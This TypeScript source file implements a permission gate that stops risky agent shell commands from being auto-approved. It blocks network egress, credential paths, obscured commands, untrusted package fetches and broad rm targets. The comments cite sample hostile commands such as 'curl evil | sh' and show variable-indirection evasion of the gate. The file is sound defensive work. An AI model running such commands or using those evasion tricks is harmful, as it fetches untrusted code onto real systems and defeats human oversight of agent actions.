/**
 * dspa-gate.ts — deterministic hard floor for /dspa auto-allow.
 *
 * The code-enforced floor (docs/dspa-redesign.md, D1): an operation may only
 * reach the judge (and be auto-allowed) if it passes every check here. The
 * LLM never has authority over these. Everything the gate does NOT check is
 * JUDGEABLE — the judge sees the full command text (including inline script
 * bodies) plus halter's analysis digest and decides; a wrong verdict can at
 * most produce a prompt, never an auto-allowed operation the floor forbids.
 *
 * Hard floor (fail closed on any):
 *  - bash: parseable, no obscured command position (variable indirection —
 *    NOT flagged by halter's own analysis, checked here explicitly), no
 *    credential-pattern paths, no network egress, no paths outside the
 *    MANUAL bar (cwd + session grants + config-allowed + trusted scripts —
 *    exactly what manual mode auto-allows, getOutsideCwdPaths) — INCLUDING
 *    paths whose location is statically unprovable (unbound variable,
 *    unresolvable cd target): Q1 is absolute, scope grants are the user's
 *    call, never the judge's. A path manual mode auto-allows (e.g. /tmp via
 *    config) is not a scope violation — the judge reviews it (D11, 2026-08-26
 *    re-alignment). Stops the judge should weigh (outside base, unresolvable
 *    location, untrusted package) are marked advisory: the fall-through
 *    prompt still renders the judge's verdict as input to the user's
 *    allow/deny/grant decision. First-word checks are
 *    wrapper/env-prefix transparent (`FOO=bar npx evil` is npx evil; `env
 *    $f` is obscured) — the policy's delegation transparency, mirrored.
 *    Unsafe patterns (inline scripts, redirects, pipes, subshells) and risk
 *    reasons are NOT floor checks — judgeable: the packet already carries
 *    the full command text and the analysis digest.
 *    Package-manager RUN forms (npx, `uv run`, `bun <script>`, …) are
 *    judgeable too (D8) — they execute local/cached code the judge can see;
 *    FETCH forms (`npm install`, `uv sync`, `bun add`, …) stay on the floor.
 *  - rm carve-out (dspa only): halter always flags rm as dangerous, and
 *    danger patterns always prompt even after Always grants. An rm command
 *    may reach the judge only when every rm target is explicit, not the
 *    working directory itself, and either inside the session base or part
 *    of a create-then-delete set (a path this same command writes via
 *    redirect/tee/touch/mkdir in an earlier segment AND rms), or a
 *    non-recursive world-scratch target directly under /tmp (D8). With
 *    -r/-R the target (if it exists) must be a directory or self-written.
 *    Non-rm danger reasons still block the carve-out (rm's neighborhood is
 *    bounded by design). The judge still approves.
 *  - file: no credential-pattern warning. A write the manual mode
 *    auto-allows (session-granted dir/file, config-allowed, project-pi) is
 *    JUDGEABLE (D3, extended by D11) — the location is user-trusted, the
 *    content is judged in full; truly outside-base writes stop (Q1: scope is
 *    the user's call). Reads are never judged.
 *  - tool (plugin-gated calls): the exec gate is fully JUDGEABLE — its
 *    script payload is opaque to static analysis by construction (the
 *    judge IS the model for it; D11 content review, untrimmed packet).
 *    The file/consent gates are never auto-allowed: low-risk prompts whose
 *    repetition session grants cover — the judge adds nothing to them.
 */
import fs from "node:fs";
import path from "node:path";
import type { PromptData } from "./decision-engine";
import type { Store } from "./store";
import { analyzeCommand } from "./analysis/command-analysis";
import { resolveOpaqueRefs } from "./analysis/var-resolution";
import { expandTilde, shortenToken } from "./analysis/path-util";
import { resolvePathReal, isInsideCwd, isAllowedReadPath, isAllowedWritePath, isProjectPiPathResolved } from "./analysis/path-analysis";
import { isTrustedScriptPath } from "./config/trusted-scripts";
import { UNKNOWN_CWD_MARKER, cdBaseBounds, OUT_REDIRECT_RE, IN_REDIRECT_RE, BARE_REDIRECT_RE } from "./analysis/cwd-tracking";
import { rootScanTarget } from "./analysis/evaluators/disk-evaluator";
import { OPAQUE_VAR_DIR } from "./analysis/bash-parser";
import { getDelegatedCommand, segmentFetchPackage } from "./analysis/segment-helpers";
import { tokenizeSegment, splitOnPipe } from "./analysis/tokenizer";
import {
  NETWORK_COMMANDS,
  NETWORK_URL_RE,
  gitNetworkSubcommand,
  skipEnvPrefixes,
} from "./config";

export type DspaGateResult =
  | { ok: true }
  | {
      ok: false;
      reason: string;
      /** D10: bare package names that stopped the command (prompt offers Trust). */
      untrustedPackages?: string[];
      /** D11: the judge still runs both stages — its verdict renders in the
       *  fall-through prompt as advisory input (the stop stands). Set for
       *  scope-class stops (outside base, unresolvable location) and
       *  untrusted packages; not for danger-class stops (a verdict on
       *  `curl evil | sh` is noise). */
      advisory?: boolean;
      /** Confirmed (user-accepted) token → dirs resolutions that fell
       *  outside the base — the fall-through prompt offers a grant for
       *  EXACTLY these dirs (deterministic; no LLM call needed). */
      confirmedOutside?: Array<{ token: string; dirs: string[] }>;
    };

/**
 * Command position obscured by variable indirection, subshell, or backtick
 * (e.g. `f=rm; $f -rf ./build`). halter's own analysis does not flag this,
 * so the gate checks it explicitly — an obscured command can never be
 * verified for auto-allow. Inline env-assignment prefixes and prefix/wrapper
 * delegation are resolved first (`FOO=bar $f …`, `env $f …` obscure exactly
 * like `$f …`).
 */
const OBSCURED_CMD_RE = /^(?:\$\w|\$\(|`)/;

function obscuredHit(segments: string[]): string | null {
  for (const seg of segments) {
    const words = seg.trim().split(/\s+/);
    const oper = words.slice(skipEnvPrefixes(words));
    let first = oper[0] ?? "";
    const deleg = getDelegatedCommand(oper.join(" "));
    if (deleg) first = deleg.tail.split(/\s+/)[0] ?? "";
    if (OBSCURED_CMD_RE.test(first)) return first.slice(0, 20);
  }
  return null;
}

/**
 * D8 (docs/dspa-redesign.md): a package-manager RUN form executes
 * local/cached code — the package name and args are visible in the judge's
 * full-text input, so it is judgeable, not a floor stop. FETCH forms
 * (`npm install`, `uv sync`, `bun add`, …) stay on the floor: fetch =
 * arbitrary postinstall execution + registry access. The 2026-08-24 log:
 * the pre-D8 floor stopped 7 of 26 dspa prompts (`npx tsc`, `npx vitest`,
 * `uv run`) while the judge stopped zero.
 */
const PKG_RUN_FORMS: Record<string, ReadonlySet<string> | "all" | "except-fetch"> = {
  npx: "all", // inherently run-a-package (fetches on miss — the judge sees the name)
  uvx: "all",
  npm: new Set(["run", "exec", "x"]),
  pnpm: new Set(["run", "dlx", "exec", "x"]),
  yarn: new Set(["run", "dlx", "x"]),
  uv: new Set(["run", "x"]),
  bun: "except-fetch", // `bun <script>` interpreter form: all but fetch verbs
};

/** bun subcommands that fetch from the registry. */
const BUN_FETCH_VERBS = new Set([
  "install", "i", "add", "remove", "rm", "update", "upgrade", "up",
  "publish", "pub", "link",
]);

/** First operative token after the command word (skips flags, `K=V` env prefixes). */
function firstSubcommand(words: string[]): string | null {
  for (let i = 1; i < words.length; i++) {
    const w = words[i];
    if (w.startsWith("-") || /^[A-Za-z_][A-Za-z0-9_]*=/.test(w)) continue;
    return w.toLowerCase();
  }
  return null;
}

/** True when this segment's first word is a judgeable package-manager RUN form (D8). */
function isPkgRunForm(first: string, words: string[]): boolean {
  const forms = PKG_RUN_FORMS[first];
  if (!forms) return false;
  if (forms === "all") return true;
  const sub = firstSubcommand(words);
  if (forms === "except-fetch") return !sub || !BUN_FETCH_VERBS.has(sub);
  return !!sub && forms.has(sub);
}

/** First egress hit only (gate reason line); URLs truncated to 60 chars.
 *  Package-manager RUN forms are skipped (D8 — judgeable). The operative
 *  first word (env-prefixes skipped) is checked, and git's subcommand is
 *  resolved past global flags via the shared gitNetworkSubcommand —
 *  `git -C dir push` is egress exactly like `git push`. */
function networkHit(command: string, segments: string[]): string | null {
  for (const seg of segments) {
    const words = seg.trim().split(/\s+/);
    const oper = words.slice(skipEnvPrefixes(words));
    const first = oper[0]?.toLowerCase();
    if (!first) continue;
    if (isPkgRunForm(first, oper)) continue;
    if (NETWORK_COMMANDS.has(first)) return first;
    const sub = gitNetworkSubcommand(words);
    if (sub) return `git ${sub}`;
  }
  const m = command.match(NETWORK_URL_RE);
  return m ? m[0].slice(0, 60) : null;
}

/**
 * D7 (docs/dspa-redesign.md): outside paths the parser could not bind to a
 * location — `<unresolved-cwd>` (a cd inside a `||` chain leaves the side's
 * directory ambiguous) or `<unresolved-var>` (opaque variable). The
 * opaque-variable dataflow lives in the analysis layer (analysis/
 * var-resolution: scoped local assignments + the tracked effective base +
 * cwd-local loop/pipeline modeling) — a sentinel that reaches the gate is
 * unbound by construction.
 *
 * Q1 is absolute (scope grants are the user's call, NEVER the judge's), so
 * an unprovable location is a FLOOR STOP, not a judgeable fall-through:
 *  - unbound variable → stop, naming the token (the prompt already lists it);
 *  - unbounded cwd marker (any unresolvable cd in the command — `cd $X`,
 *    glob, `cd -`) → stop; the side's base could be ANYWHERE;
 *  - bounded cwd marker (every cd literal, per cdBaseBounds) → the side runs
 *    under one of the candidate bases (session cwd + each literal cd target);
 *    EVERY candidate is checked against the base — all inside → drop, any
 *    outside → stop naming the CONCRETE dir (one Always-for-dir makes later
 *    runs pass, D3-style).
 *
 * The 2026-08-24 "single resolvable cd target bounds the side" reading is
 * REVISED (2026-08-25 review): it resolved relative targets against the
 * PROCESS cwd (wrong root) and claimed boundedness even when an earlier
 * unresolvable cd made the base unbounded — both let outside-base reads
 * pass the floor.
 */
/**
 * The manual bar (Q1 floor): a path is inside it when manual mode would
 * not prompt for it — under the cwd, in a session-granted dir, config-
 * allowed, or a trusted script. Shared by the gate (scope checks) and the
 * prompt flow (deciding which one-shot-"Yes" resolutions are safe to
 * confirm — all-in-bar dirs never needed a grant, so confirming them only
 * makes the next run deterministic).
 */
export function makeManualBar(store: Store, cwd: string): (p: string) => boolean {
  return (p: string) =>
    isInsideCwd(p, cwd) ||
    store.isInsideAllowedDir(p, "read") ||
    isAllowedReadPath(p) ||
    isAllowedWritePath(p) ||
    isTrustedScriptPath(p);
}

type D7Resolution =
  | { kind: "inside" } // every candidate base keeps it in-base
  | { kind: "outside"; paths: string[]; confirmedToken?: string } // concrete outside-base locations
  | { kind: "stop"; reason: string }; // unprovable location — Q1 floor stop

/**
 * Resolve one sentinel outside path (see D7 above).
 *
 * `confirmed` is the user-accepted resolution for an opaque-var token
 * (store.getConfirmedResolution — set when the user took an option that
 * granted the LLM-suggested dirs for it). A confirmed sentinel is judged
 * like a concrete location: every confirmed dir inside the base → in-base
 * (judgeable); any dir outside → an outside stop naming exactly those dirs
 * (the prompt offers a grant for them, so the next identical run passes —
 * steady state without an LLM). Unconfirmed → the Q1 floor stop.
 */
function d7ResolveSentinel(
  p: string,
  cwd: string,
  isInsideBase: (p: string) => boolean,
  bounds: { unbounded: boolean; candidates: string[] },
  opaque: { token: string | null; confirmed: string[] | null },
): D7Resolution {
  if (p.startsWith(OPAQUE_VAR_DIR)) {
    const token =
      opaque.token ?? p.slice(OPAQUE_VAR_DIR.length + 1).replace(/^\//, "");
    if (opaque.confirmed) {
      const outside = opaque.confirmed.filter((d) => !isInsideBase(d));
      return outside.length > 0
        ? { kind: "outside", paths: outside, confirmedToken: token }
        : { kind: "inside" };
    }
    return { kind: "stop", reason: `runtime location unresolvable (${shortenToken(token)})` };
  }
  if (p.startsWith(UNKNOWN_CWD_MARKER)) {
    if (bounds.unbounded) {
      return { kind: "stop", reason: "runtime working directory unresolvable (cd target not statically knowable)" };
    }
    // Bounded: the side's base is one of the candidates; a `..` tail can
    // escape from ANY of them, so every candidate must be checked against
    // the base (not just the last cd target).
    const rest = p.slice(UNKNOWN_CWD_MARKER.length).replace(/^\//, "");
    const locations = bounds.candidates.map((c) => path.resolve(c, rest));
    const outside = locations.filter((l) => !isInsideBase(l));
    return outside.length > 0 ? { kind: "outside", paths: outside } : { kind: "inside" };
  }
  return { kind: "stop", reason: "runtime location unresolvable" };
}

export async function checkDspaGate(
  pd: PromptData,
  store: Store,
): Promise<DspaGateResult> {
  if (pd.type === "tool") {
    if (pd.gate !== "exec") {
      return { ok: false, reason: `tool ${pd.gate} is not judgeable (session grants, not the judge, cover it)` };
    }
    // exec: the payload is the whole model — no deterministic floor applies
    // (it's opaque by construction); the two-stage judge decides (D11).
    return { ok: true };
  }

  if (pd.type === "file") {
    // D3 (docs/dspa-redesign.md): a write into a session-granted dir is
    // judgeable — the user trusted the dir, so the outside-base stop does
    // not apply; the two-stage judge decides on the content. Ungranted
    // outside-cwd writes stay on the floor (Q1). Reads are never judged.
    // D11: the floor's bar is the MANUAL write bar — a write manual mode
    // auto-allows (session-granted dir or file, config-allowed, project-pi)
    // is judgeable: the location is already user-trusted, the content is
    // judged in full (the D3 probe converts that auto-allow to this prompt).
    // Only truly outside-base writes stop (Q1: scope is the user's call).
    const insideManualWriteBar =
      pd.isWriteOp &&
      (store.isInsideAllowedDir(pd.resolved, "write") ||
        store.hasAllowedWritePath(pd.resolved) ||
        isAllowedWritePath(pd.resolved) ||
        isProjectPiPathResolved(pd.resolved, pd.cwd));
    // Name the violated base (the session cwd), not outsideDir — the
    // target's own parent (the grant-offer unit): `outside base (/a/b/config)`
    // read as though the file were outside its parent dir. The grant dir
    // stays visible in the same log line (promptDir/target).
    if (!insideManualWriteBar && pd.outsideDir) {
      return { ok: false, reason: `outside base (session ${pd.cwd})`, advisory: true };
    }
    if (pd.warnedRule) return { ok: false, reason: `credential pattern (${pd.warnedRule})` };
    return { ok: true };
  }

  // bash — trust the analysis the decision was made from (single analysis
  // per decision); re-analyze only for hand-constructed prompt data.
  const analysis =
    pd.analysis ??
    (await analyzeCommand(pd.command, pd.cwd, {
      isInsideAllowedDir: (p) => store.isInsideAllowedDir(p, "read"),
      getConfirmedResolution: (t) => store.getConfirmedResolution(t),
    }));
  if (analysis.hasParseError) return { ok: false, reason: "unparseable command" };

  // D11 (2026-08-26 re-alignment): the floor's bar is the MANUAL bar — the
  // same predicate the analysis uses for prompt.outsidePaths
  // (getOutsideCwdPaths): cwd + session grants (read checks both sets) +
  // config-allowed paths + trusted scripts. A location manual mode
  // auto-allows is not a scope violation — the judge reviews it; only what
  // manual would prompt for (outside base) stops here (Q1, re-confirmed).
  const isInsideManualBar = makeManualBar(store, pd.cwd);

  let outsideExempt = new Set<string>();
  const hasRm = analysis.segments.some(isRmSegment);
  if (hasRm) {
    // rm carve-out: bounded, explicit targets only (see header).
    const rm = checkRmTargets(analysis.segments, pd.cwd, isInsideManualBar);
    if (rm.reason) return { ok: false, reason: rm.reason };
    outsideExempt = rm.exempt;
    // Non-rm dangerous reasons still block: the carve-out covers only the
    // rm's own footprint (recursive/forced delete, its self-written
    // redirect/pipe). Other dangerous content in the command — script
    // interpreters, file-modification patterns, … — is not judgeable.
    const otherDanger = analysis.risk.reasons.filter((r) => !RM_RISK_REASON_RE.test(r));
    if (otherDanger.length > 0) {
      return { ok: false, reason: `dangerous: ${otherDanger.join("; ").slice(0, 120)}` };
    }
  }
  // Non-rm: unsafe patterns and risk reasons are JUDGEABLE (D1) — inline
  // scripts, redirects, pipes, subshells, file-modification patterns. The
  // packet carries the full command text (heredoc bodies included) plus
  // halter's analysis digest; the judge decides. The floor checks below
  // (obscured position, credentials, network, outside base) still apply.
  const obscured = obscuredHit(analysis.segments);
  if (obscured) return { ok: false, reason: `obscured command position (${obscured})` };
  if (pd.credentialRule) return { ok: false, reason: `credential pattern (${pd.credentialRule})` };
  // D10 (docs/dspa-redesign.md): a fetchable run form names a package that
  // may be FETCHED (and executed) on cache miss — the same fetch class the
  // floor stops for fetch forms. Trust is per bare package name, granted
  // only by the user's "Trust" click on the stop's prompt. Local run forms
  // (npm run, uv run, bun <script>) execute repo-visible code and are never
  // gated. The parser flattens subshell contents into segments, so
  // `out=$(npx foo)` is seen too; only opaque indirection (eval, $f) stays
  // judge-only (the obscured-position check above). segmentFetchPackage
  // resolves inline env prefixes and wrapper delegation first
  // (`FOO=bar npx evil`, `env npx evil` are npx evil) — the gate must not
  // be evadable by prefixing.
  const untrusted: string[] = [];
  for (const seg of analysis.segments) {
    const ff = segmentFetchPackage(seg);
    if (ff && !store.hasTrustedPackage(ff.pkg)) untrusted.push(`${ff.first} ${ff.pkg}`);
  }
  if (untrusted.length > 0) {
    const uniq = [...new Set(untrusted)];
    return {
      ok: false,
      reason: `untrusted package (${uniq.slice(0, 3).join(", ")})`,
      untrustedPackages: uniq.map((s) => s.split(/\s+/)[1]),
      advisory: true,
    };
  }
  // Full-filesystem scan (find /, grep -rn /): a dedicated stop reason —
  // conspicuous in plain sight, and the generic outside-base reason
  // ("touches paths outside base (/)") understates what the command does.
  for (const seg of analysis.segments) {
    const scan = rootScanTarget(seg);
    if (scan) return { ok: false, reason: `full filesystem scan (${scan} /)` };
  }
  const net = networkHit(pd.command, analysis.segments);
  if (net) return { ok: false, reason: `network egress (${net})` };
  // prompt.outsidePaths already applied the manual bar (above): what's left
  // is exactly what manual mode would prompt for — the scope class (Q1:
  // the user's call, judgeable only after an Always-for-dir grant). The D7
  // 5ef1f0f session-base re-filter is reverted by D11: config-allowed
  // concrete paths (`cat > /tmp/x`) are judgeable, matching their
  // opaque-resolved counterparts under the same bar. Sentinels pass through
  // unchanged and keep the D7 resolution below.
  const outside = (analysis.prompt.outsidePaths ?? []).filter((p) => !outsideExempt.has(p));
  // D7: resolve the sentinels (see d7ResolveSentinel). Concrete outside
  // locations stop (naming the dir for a one-time grant); unprovable
  // locations stop outright (Q1 — never judgeable).
  const bounds = cdBaseBounds(analysis.parsedSegments, pd.cwd);
  const resolvedOutside: string[] = [];
  const confirmedOutside: Array<{ token: string; dirs: string[] }> = [];
  // Each unbound opaque ref contributes TWO entries: the raw reference text
  // (e.g. /base/$e/f) and its marker twin (<unresolved-var>/base/$e/f —
  // never inside the bar). The marker is the location authority for the ref:
  // a confirmed resolution judges the real dirs; without one, the floor
  // stops. The raw text alone stops nothing — it is a shell token, not a
  // filesystem location (its value can be anything). marker → token comes
  // from the analysis's own unresolved list (the marker string alone is
  // ambiguous for absolute tokens — path.join dropped their leading slash).
  const tokenByMarker = new Map<string, string>();
  const markerByToken = new Map<string, string>();
  for (const u of analysis.prompt.unresolved) {
    tokenByMarker.set(u.marker, u.token);
    markerByToken.set(u.token, u.marker);
  }
  const markersInOutside = new Set(
    outside.filter((p) => p.startsWith(OPAQUE_VAR_DIR)),
  );
  for (const p of outside) {
    if (!p.startsWith(OPAQUE_VAR_DIR) && !p.startsWith(UNKNOWN_CWD_MARKER)) {
      // Its marker twin is in the outside set → the sentinel pass handles
      // this ref (confirmed dirs judge it; unconfirmed stops it).
      if (markersInOutside.has(markerByToken.get(p) ?? "")) continue;
      resolvedOutside.push(p);
      continue;
    }
    const token = p.startsWith(OPAQUE_VAR_DIR) ? tokenByMarker.get(p) ?? null : null;
    const r = d7ResolveSentinel(p, pd.cwd, isInsideManualBar, bounds, {
      token,
      confirmed: token ? store.getConfirmedResolution(token) : null,
    });
    if (r.kind === "outside") {
      resolvedOutside.push(...r.paths);
      if (r.confirmedToken) confirmedOutside.push({ token: r.confirmedToken, dirs: r.paths });
    } else if (r.kind === "stop") return { ok: false, reason: r.reason, advisory: true };
    // inside → drop
  }
  // Opaque refs re-resolved under the floor's (manual) bar — defensive twin
  // of the analysis-layer resolution above: a value the bar allows (e.g.
  // /tmp via config) is dropped, a concrete outside path stops (D7).
  const floor = resolveOpaqueRefs(
    analysis.opaque,
    analysis.parsedSegments,
    analysis.effectiveCwds,
    analysis.assignments,
    pd.cwd,
    isInsideManualBar,
  );
  resolvedOutside.push(...floor.paths);
  // D12 confirmed resolutions: the analysis layer already made a confirmed
  // sentinel concrete (its outside dirs are in resolvedOutside above, or it
  // dropped out entirely when all in-bar). Surface any confirmed token whose
  // dirs fall outside the bar so the prompt labels them `confirmed` and the
  // paths grant covers them — the same bar (isInsideManualBar) the analysis
  // used, so this agrees with what the floor just resolved.
  for (const u of analysis.prompt.unresolved) {
    const confirmed = store.getConfirmedResolution(u.token);
    if (!confirmed) continue;
    const out = confirmed.filter((d) => !isInsideManualBar(d));
    if (out.length > 0 && !confirmedOutside.some((c) => c.token === u.token)) {
      confirmedOutside.push({ token: u.token, dirs: out });
    }
  }
  if (resolvedOutside.length > 0) {
    const shown = [...new Set(resolvedOutside)].slice(0, 2);
    return {
      ok: false,
      reason: `touches paths outside base (${shown.join(", ")})`,
      advisory: true,
      ...(confirmedOutside.length > 0 ? { confirmedOutside } : {}),
    };
  }
  return { ok: true };
}

// ── rm carve-out ────────────────────────────────────────────────────────

/** Risk reasons that belong to rm's own footprint (or the self-write that
 * feeds it) — filtered out in the rm branch instead of blocking. Everything
 * else in analysis.risk.reasons blocks the judge. The strings are the rm
 * footprint reasons actually emitted — system-evaluator (recursive/forced
 * delete, mass deletion, entire-tree/home targets) and the dangerous-
 * pattern hit `[Pattern] rm (any file deletion)` — plus the medium-noise
 * self-write entries (pipe operator, input/output redirection, tee's file-
 * writing flag) that appear in legitimate shapes (`echo … | tee f && rm f`);
 * the dangerous pipeline forms have their own, non-matching reasons ("pipe
 * to a shell", per-stage evaluator hits). Deliberately NOT a bare word match
 * — `git rm (…)` and `aws s3 rm (…)` are non-rm dangerous ops and must
 * block the carve-out. New reason strings fail safe (block → prompt). */
const RM_RISK_REASON_RE =
  /\brecursive delete\b|\bforced delete\b|mass deletion|entire (?:tree|home) deleted|\[Pattern\] rm \(|shell (?:input|output) redirection|pipe operator|tee \(file writing\)/i;
/** Targets that can never be auto-allowed: globs, tildes, computed
 * (variable/substitution) paths. */
const RM_FORBIDDEN_TARGET_RE = /[*?[~$`]/;

/**
 * D8 (docs/dspa-redesign.md): an explicit, non-recursive rm of a
 * world-scratch target directly under /tmp is judgeable — the judge sees
 * the full text, and /tmp is the conventional scratch area (`rm -f
 * /tmp/probe.log` cleanup stopped 4 of 26 dspa prompts in the 2026-08-24
 * log). Recursive, glob, variable, and tilde targets never reach here
 * (the explicitness checks fail first); /tmp itself is not a target.
 */
function isTmpScratchTarget(resolved: string, recursive: boolean): boolean {
  return !recursive && resolved.startsWith("/tmp/");
}

/**
 * The tokens a segment OPERATES with: quote-aware (tokenizeSegment), inline
 * env-assignment prefixes stripped (`FOO=bar rm …` is an rm), and
 * prefix/wrapper delegation resolved (`env rm …` is an rm) — the carve-out's
 * target checks must see the same command the policy sees.
 */
function operativeTokens(seg: string): string[] {
  const tokens = tokenizeSegment(seg);
  const rest = tokens.slice(skipEnvPrefixes(tokens));
  const deleg = getDelegatedCommand(rest.join(" "));
  return deleg ? deleg.tail.split(/\s+/) : rest;
}

function isRmSegment(seg: string): boolean {
  const first = operativeTokens(seg)[0]?.split("/").pop()?.toLowerCase();
  return first === "rm";
}

const SELF_WRITE_CMDS = new Set(["tee", "touch", "mkdir"]);

/** Strip one pair of matching quotes from a raw token. */
function cleanToken(t: string): string {
  if (t.length >= 2 && ((t[0] === '"' && t.endsWith('"')) || (t[0] === "'" && t.endsWith("'")))) {
    return t.slice(1, -1);
  }
  return t;
}

/** /dev/* targets are not real writes (>/dev/null, /dev/stderr, …). */
function isDevNullish(resolved: string): boolean {
  return resolved === "/dev" || resolved.startsWith("/dev/");
}

/**
 * Validate every rm target in the command. Returns a block reason, or the
 * create-then-delete set (self-written paths that are also rm targets) to
 * exempt from the outside-base check.
 */
function checkRmTargets(
  segments: string[],
  cwd: string,
  isInsideBase: (p: string) => boolean,
): { reason: string | null; exempt: Set<string> } {
  const written = new Set<string>();
  const rmTargets = new Set<string>();
  const noPreserveRoot = () => ({ reason: "rm with --no-preserve-root" as string | null, exempt: new Set<string>() });

  // First pass: collect self-written paths (ordered by segment) and rm targets.
  for (let i = 0; i < segments.length; i++) {
    const seg = segments[i];
    const words = operativeTokens(seg);
    if (isRmSegment(seg)) {
      if (words.includes("--no-preserve-root")) return noPreserveRoot();
      const args = words.slice(1).filter((t) => !t.startsWith("-"));
      if (args.length === 0) return { reason: "rm without explicit targets", exempt: new Set() };
      const recursive = words.slice(1).some(
        (t) => t === "--recursive" || (t.startsWith("-") && !t.startsWith("--") && t !== "-" && /[rR]/.test(t)),
      );
      for (const a of args) {
        const target = cleanToken(a);
        if (RM_FORBIDDEN_TARGET_RE.test(target)) {
          return { reason: `rm target not explicit (${target.slice(0, 40)})`, exempt: new Set() };
        }
        if (target === "-") return { reason: "rm reading from stdin", exempt: new Set() };
        const resolved = resolvePathReal(expandTilde(target), cwd);
        if (resolved === cwd) return { reason: "rm target is the working directory itself", exempt: new Set() };
        if (recursive) {
          try {
            const st = fs.statSync(resolved);
            const selfWritten = written.has(resolved);
            if (!st.isDirectory() && !st.isFile() && !selfWritten) {
              return { reason: `rm -r target is not a file or directory (${a.slice(0, 60)})`, exempt: new Set() };
            }
            if (!st.isDirectory() && !st.isFile() && selfWritten) {
              /* self-written: trust the earlier segment */
            }
          } catch {
            /* doesn't exist — nothing to delete */
          }
        }
        rmTargets.add(resolved);
        if (
          !isInsideBase(resolved) &&
          !written.has(resolved) &&
          !isTmpScratchTarget(resolved, recursive)
        ) {
          return { reason: `rm target outside base (${a.slice(0, 60)})`, exempt: new Set() };
        }
      }
    } else {
      // Self-written paths from this earlier segment. Quote-aware token scan:
      // a `>` inside quotes (echo "a > b") is data, not a redirect — the old
      // raw-text regex fabricated a self-write for it.
      const tokens = tokenizeSegment(seg);
      for (let ti = 0; ti < tokens.length; ti++) {
        const tok = tokens[ti];
        const m = tok.match(OUT_REDIRECT_RE) ?? tok.match(IN_REDIRECT_RE);
        let target: string | null = null;
        if (m) target = m[2] !== "" ? m[2] : (tokens[ti + 1] ?? null);
        else if (BARE_REDIRECT_RE.test(tok)) target = tokens[ti + 1] ?? null;
        if (target === null || target.startsWith("&")) continue; // fd duplication (2>&1, > &1)
        if (RM_FORBIDDEN_TARGET_RE.test(target)) continue; // glob/var/computed — never a concrete self-write
        const resolved = resolvePathReal(expandTilde(target), cwd);
        if (isDevNullish(resolved)) continue;
        written.add(resolved);
      }
      // Self-write commands per pipeline stage — `a | tee f` hides tee
      // behind the segment's first word. splitOnPipe is quote-aware.
      for (const stage of splitOnPipe(seg)) {
        const sw = operativeTokens(stage);
        const scmd = sw[0]?.split("/").pop()?.toLowerCase() ?? "";
        if (!SELF_WRITE_CMDS.has(scmd)) continue;
        for (const t of sw.slice(1)) {
          const target = cleanToken(t);
          if (t.startsWith("-") || /^[\d<>]/.test(t) || RM_FORBIDDEN_TARGET_RE.test(target)) continue;
          const resolved = resolvePathReal(expandTilde(target), cwd);
          if (isDevNullish(resolved)) continue;
          written.add(resolved);
        }
      }
    }
  }

  // Every self-written path must be in-base or cleaned up by this command.
  for (const w of written) {
    if (!isInsideBase(w) && !rmTargets.has(w)) {
      return { reason: `write-redirect outside base, not cleaned by this command (${w.slice(0, 60)})`, exempt: new Set() };
    }
  }

  // Self-written targets are exempt from the floor's outside-base stop —
  // the create-then-delete set is judgeable (D8 /tmp-scratch targets are
  // inside the manual bar via config and never reach the outside set).
  return { reason: null, exempt: new Set([...rmTargets].filter((t) => written.has(t))) };
}
